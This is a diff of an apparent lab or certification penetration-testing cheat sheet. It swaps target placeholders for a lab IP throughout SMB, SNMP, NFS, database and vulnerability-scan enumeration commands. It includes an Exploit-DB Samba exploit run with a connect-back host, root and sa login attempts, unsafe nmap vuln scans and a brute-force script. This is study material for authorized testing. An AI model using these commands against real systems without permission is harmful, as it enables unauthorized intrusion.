+enum4linux -a -u guest -v 10.10.10.149 >  enum4linux
 
 ### RPCCLIENT
-rpcclient -U "" *target*
+rpcclient -U "" 10.10.10.149
 
     srvinfo
 	
@@ -2877,19 +3190,19 @@ rpcclient -U "" *target*
 
 ### SMBClient
 
-nmap -p445 --script=smb-enum-shares *target*
+nmap -p445 --script=smb-enum-shares 10.10.10.149
 
-smbclient -L *target*
+smbclient -L 10.10.10.149
 
-smbclient -L=*target*
+smbclient -L=10.10.10.149
 
-smbclient //*target*/tmp
+smbclient //10.10.10.149/tmp
 
-smbclient \\\\*target*\\tmp
+smbclient \\\\10.10.10.149\\tmp
 
-smbclient \\\\*target*\\home
+smbclient \\\\10.10.10.149\\home
 
-smbclient \\\\*target*\\ipc*dollar-sign* -U john
+smbclient \\\\10.10.10.149\\ipc*dollar-sign* -U john
 
 smbclient //INSERTIPADDRESS/ipc*dollar-sign* -U john  
 
@@ -2910,21 +3223,21 @@ Ls
 
 Get files
 
-smbget -R smb://*target*/tmp
+smbget -R smb://10.10.10.149/tmp
 
 Put files
 
 ### Port 139/445 - SAMBA
 
-enum4linux *target*
+enum4linux 10.10.10.149
 
-enum4linux -a -u guest -v *target*
+enum4linux -a -u guest -v 10.10.10.149
 
-enum4linux -a -u root -v *target*
+enum4linux -a -u root -v 10.10.10.149
 
 nmap --script=smb-enum-shares.nse ip
 
-smbclient //*target*/squirtle
+smbclient //10.10.10.149/squirtle
 
 smb:> cat key.txt
 
@@ -2938,7 +3251,7 @@ Ideas are below
 
 cp /usr/share/exploitdb/platforms/linux/remote/7.pl .
 
-perl 7.pl -t linx86 -H *target* -h 10.11.1.22
+perl 7.pl -t linx86 -H 10.10.10.149 -h 10.11.1.22
 
 Command: -msf> search scanner/samba
 
@@ -2974,29 +3287,29 @@ root@kali:~# onesixtyone -c community -i ips
 
 Use snmpwalk and snmp-check to gather information about the discovered targets.
 
-snmpwalk -c public -v1 *target*
+snmpwalk -c public -v1 10.10.10.149
 
 Enumerating Windows Users:
 
-snmpwalk -c public -v1 *target* 1.3.6.1.4.1.77.1.2.25
+snmpwalk -c public -v1 10.10.10.149 1.3.6.1.4.1.77.1.2.25
 
 Enumerating Running Windows Processes:
 
-snmpwalk -c public -v1 *target* 1.3.6.1.2.1.25.4.2.1.2
+snmpwalk -c public -v1 10.10.10.149 1.3.6.1.2.1.25.4.2.1.2
 
 Enumerating Open TCP Ports:
 
-snmpwalk -c public -v1 *target* 1.3.6.1.2.1.6.13.1.3
+snmpwalk -c public -v1 10.10.10.149 1.3.6.1.2.1.6.13.1.3
 
 Enumerating Installed Software
 
-snmpwalk -c public -v1 *target* 1.3.6.1.2.1.25.6.3.1.2
+snmpwalk -c public -v1 10.10.10.149 1.3.6.1.2.1.25.6.3.1.2
 
 nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes INSERTIPADDRESS
 
-snmp-check -t *target*S -c public
+snmp-check -t 10.10.10.149S -c public
 
-nmap -sU --open -p 161 *target*-254 -oG mega-snmp.txt
+nmap -sU --open -p 161 10.10.10.149-254 -oG mega-snmp.txt
 
 Metasploit SNMP community scanner
 
@@ -3032,7 +3345,7 @@ scanner/mssql/mssql_login
 
 ### Log in to mssql
 
-sqsh -S *target* -U sa
+sqsh -S 10.10.10.149 -U sa
 
 ### Execute commands
 
@@ -3049,9 +3362,9 @@ If you have credentials look in metasploit for other modules.
 - Password protected:
 
 
-tnscmd10g version -h *target*
+tnscmd10g version -h 10.10.10.149
 
-tnscmd10g status -h *target*
+tnscmd10g status -h 10.10.10.149
 
 
 ### Port 2049 - NFS Enumeration
@@ -3064,21 +3377,21 @@ apt-get install nfs-common
 
 showmount -h
 
-showmount --exports *target*
+showmount --exports 10.10.10.149
 
-showmount *target*
+showmount 10.10.10.149
 
-showmount -e *target*
+showmount -e 10.10.10.149
 
 If you find anything you can mount it like this:
 
 mkdir /tmp/nfs
 
-mount *target*:/ /tmp/nfs
+mount 10.10.10.149:/ /tmp/nfs
 
-mount -t *target*:/ /tmp/nfs
+mount -t 10.10.10.149:/ /tmp/nfs
 
-mount -t nfs *target*:/home/vulnix /tmp/nfs
+mount -t nfs 10.10.10.149:/home/vulnix /tmp/nfs
 
 cd /tmp
 
@@ -3155,9 +3468,9 @@ Located in viper
 
 Located in viper
 
-nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse *target* -p 3306
+nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse 10.10.10.149 -p 3306
 
-mysql --host=*target* -u root -p
+mysql --host=10.10.10.149 -u root -p
 
 ### ABSINTH 
 
@@ -3184,7 +3497,7 @@ rdesktop -u guest -p guest INSERTIPADDRESS -g 94%
 
 ### Port 443 - HTTPS
 
-nmap -sV -p 443 --script=ssl-heartbleed *target*/24
+nmap -sV -p 443 --script=ssl-heartbleed 10.10.10.149/24
 
 
 ### SSLyze.py
@@ -3196,7 +3509,7 @@ Heartbleed:
 
 ### Heartbleed
 
-sslscan *target*:443
+sslscan 10.10.10.149:443
 
 ### Port 5900 VNC
 
@@ -3216,8 +3529,8 @@ What is my local host: *localhost*
 
 Info- Sheet
 
-+ IP address: *target*
-+ DNS-Domain name: *target-domain*
++ IP address: 10.10.10.149
++ DNS-Domain name: http://10.10.10.149/
 + Host name: *host-name*
 + OS: *os*
 + Web Server (web server name): *web-server*
@@ -3261,15 +3574,15 @@ Examples
 
 ```
 
-nmap -v -p- --script=vuln script-args=unsafe=1 *target* -oX vulns-results.xml
+nmap -v -p- --script=vuln script-args=unsafe=1 10.10.10.149 -oX vulns-results.xml
 
 example below
 
 ls /usr/share/nmap/scripts/*ftp* or *http*
 
-nmap -v -p 80 --script=http-vuln-cve2010-2861 *target*
+nmap -v -p 80 --script=http-vuln-cve2010-2861 10.10.10.149
 
-nmap -v -p 80 --script=http-vuln-cve2011-3192 *target*-210
+nmap -v -p 80 --script=http-vuln-cve2011-3192 10.10.10.149-210
 
 insert vuln scans here
 
@@ -3288,13 +3601,13 @@ download this package
 6.	cp *.csv /usr/share/nmap/scripts/vulscan/
 7.	cp *.nse /usr/share/nmap/scripts/vulscan/
 
-nmap -sV --script=vulscan/vulscan.nse *target* -oX big-vuln-list.xml
+nmap -sV --script=vulscan/vulscan.nse 10.10.10.149 -oX big-vuln-list.xml
 
 ### NMAP VulnScan
 
 ls -lh /usr/share/nmap/scripts/*vuln*
 
-nmap -sV --script=vulscan/vulscan.nse *target* -oX vulscan_vulscan_dbs.xml
+nmap -sV --script=vulscan/vulscan.nse 10.10.10.149 -oX vulscan_vulscan_dbs.xml
 
 ***important export vulnlists to html**
 
@@ -3307,14 +3620,14 @@ vulscandb=/usr/share/nmap/scripts/vulscan/exploitdb.csv > ~/pwk_recon/vulscan-re
 
 ### Nmap OPENVAS VulnScan
 
-nmap -sS -sV --script=/usr/share/nmap/scripts/vulscan/vulscan.nse *target*  --script-args 
+nmap -sS -sV --script=/usr/share/nmap/scripts/vulscan/vulscan.nse 10.10.10.149  --script-args 
 
 vulscandb=/usr/share/nmap/scripts/vulscan/openvas.csv
 
 nmap -sS -sV --script=/usr/share/nmap/scripts/vulscan/vulscan.nse -iL ~/pwk_recon/LiveHosts.txt --script-args 
 vulscandb=/usr/share/nmap/scripts/vulscan/openvas.csv
 
-nmap -sV --script=openvas-otp-brute *target*
+nmap -sV --script=openvas-otp-brute 10.10.10.149
 
 ### IDENTIFY THE NETWORK INFRASTRUCTURE #2
 
